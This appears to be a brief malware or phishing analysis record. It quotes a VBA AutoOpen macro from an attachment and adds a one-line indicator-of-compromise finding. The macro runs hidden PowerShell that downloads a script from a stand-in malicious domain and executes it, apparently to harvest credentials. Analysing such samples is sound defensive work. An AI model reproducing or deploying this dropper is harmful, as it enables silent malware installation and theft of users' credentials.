attachment.macro_code_snippet:
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.ps1' -OutFile 'C:\\Windows\\Temp\\payload.ps1'; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\payload.ps1' -WindowStyle Hidden\""
End Sub
attachment.ioc_analysis: The macro executes a PowerShell command that silently downloads and runs a script from a known malicious domain, which is linked to a credential harvester.
